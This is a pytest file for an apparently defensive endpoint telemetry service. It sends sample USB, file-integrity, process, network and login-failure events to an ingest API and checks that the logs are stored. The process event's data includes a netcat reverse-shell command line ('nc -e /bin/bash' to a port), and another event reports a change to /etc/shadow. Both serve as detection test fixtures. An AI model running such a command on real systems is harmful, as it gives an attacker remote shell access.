import pytest
import uuid
from datetime import datetime, timezone
from fastapi.testclient import TestClient

from app.main import app
from app.db.database import Base, engine, SessionLocal
from app.db.init_db import init_db
from app.models.device import Device, DeviceStatus, OSType
from app.models.telemetry_log import UnifiedTelemetryLog, TelemetryCategoryEnum
from app.services import telemetry_service


@pytest.fixture(scope="module")
def db_session():
    Base.metadata.create_all(bind=engine)
    session = SessionLocal()
    try:
        init_db(session)
    except Exception:
        pass
    yield session
    session.close()


@pytest.fixture(scope="module")
def client():
    with TestClient(app) as c:
        yield c


@pytest.fixture
def telemetry_device(db_session):
    device = Device(
        id=uuid.uuid4(),
        hostname="telemetry-framework-node",
        ip_address="192.168.1.250",
        os_type=OSType.LINUX,
        status=DeviceStatus.ONLINE,
        is_active=True
    )
    db_session.add(device)
    db_session.commit()
    db_session.refresh(device)
    return device


def test_standardized_telemetry_ingestion_framework(db_session, client, telemetry_device):
    dev_id = telemetry_device.id
    dev_id_str = str(dev_id)

    # 1. Prepare standardized events across ALL 5 collectors
    events = [
        # USB Collector Event
        {
            "event_id": str(uuid.uuid4()),
            "device_id": dev_id_str,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "category": "USB",
            "event_type": "USB_INSERTED",
            "source": "USBCollector",
            "host_info": {"hostname": telemetry_device.hostname},
            "payload": {"vendor_id": "0781", "product_id": "5581", "serial_number": "TESTUSB123"}
        },
        # File Integrity Collector Event
        {
            "event_id": str(uuid.uuid4()),
            "device_id": dev_id_str,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "category": "FILE_INTEGRITY",
            "event_type": "FILE_MODIFIED",
            "source": "FileWatcher",
            "host_info": {"hostname": telemetry_device.hostname},
            "payload": {"file_path": "/etc/shadow", "event_type": "MODIFIED", "sha256": "abc123def456"}
        },
        # Process Collector Event
        {
            "event_id": str(uuid.uuid4()),
            "device_id": dev_id_str,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "category": "PROCESS",
            "event_type": "PROCESS_STARTED",
            "source": "ProcessCollector",
            "host_info": {"hostname": telemetry_device.hostname},
            "payload": {"pid": 9999, "name": "nc", "cmdline": "nc -e /bin/bash 10.0.0.1 4444", "ppid": 1000}
        },
        # Network Collector Event
        {
            "event_id": str(uuid.uuid4()),
            "device_id": dev_id_str,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "category": "NETWORK",
            "event_type": "NETWORK_CONNECTION",
            "source": "NetworkCollector",
            "host_info": {"hostname": telemetry_device.hostname},
            "payload": {"pid": 9999, "local_port": 54321, "remote_address": "198.51.100.1", "remote_port": 4444, "protocol": "TCP", "state": "ESTABLISHED"}
        },
        # Security Event Collector Event
        {
            "event_id": str(uuid.uuid4()),
            "device_id": dev_id_str,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "category": "SECURITY_EVENT",
            "event_type": "AUTHENTICATION_FAILURE",
            "source": "EventLogCollector",
            "host_info": {"hostname": telemetry_device.hostname},
            "payload": {"event_id": "4625", "event_source": "Security", "username": "admin", "status": "FAILED"}
        }
    ]

    # 2. Ingest batch via REST API `POST /api/v1/telemetry/ingest`
    resp = client.post("/api/v1/telemetry/ingest", json={
        "device_id": dev_id_str,
        "events": events
    })
    assert resp.status_code == 201
    data = resp.json()
    assert data["status"] == "SUCCESS"
    assert data["events_processed"] == 5

    # Create/seed admin user and obtain token headers
    init_db(db_session)
    login_res = client.post("/api/v1/auth/login/json", json={
        "username_or_email": "admin",
        "password": "AdminPassword123!"
    })

    assert login_res.status_code == 200
    token = login_res.json()["access_token"]
    headers = {"Authorization": f"Bearer {token}"}

    # 3. Query unified telemetry audit logs via REST API `GET /api/v1/telemetry/logs`
    logs_resp = client.get(f"/api/v1/telemetry/logs?device_id={dev_id_str}", headers=headers)
    assert logs_resp.status_code == 200
    logs_data = logs_resp.json()
    assert len(logs_data) >= 5


    categories_found = {log["category"] for log in logs_data}
    assert "USB" in categories_found
    assert "FILE_INTEGRITY" in categories_found
    assert "PROCESS" in categories_found
    assert "NETWORK" in categories_found
    assert "SECURITY_EVENT" in categories_found


    # 4. Verify DB records in `telemetry_logs`
    db_records = db_session.query(UnifiedTelemetryLog).filter(
        UnifiedTelemetryLog.device_id == dev_id
    ).all()
    assert len(db_records) >= 5
    assert all(r.correlation_id is not None for r in db_records)
    assert all(r.tenant_id == "default_tenant" for r in db_records)

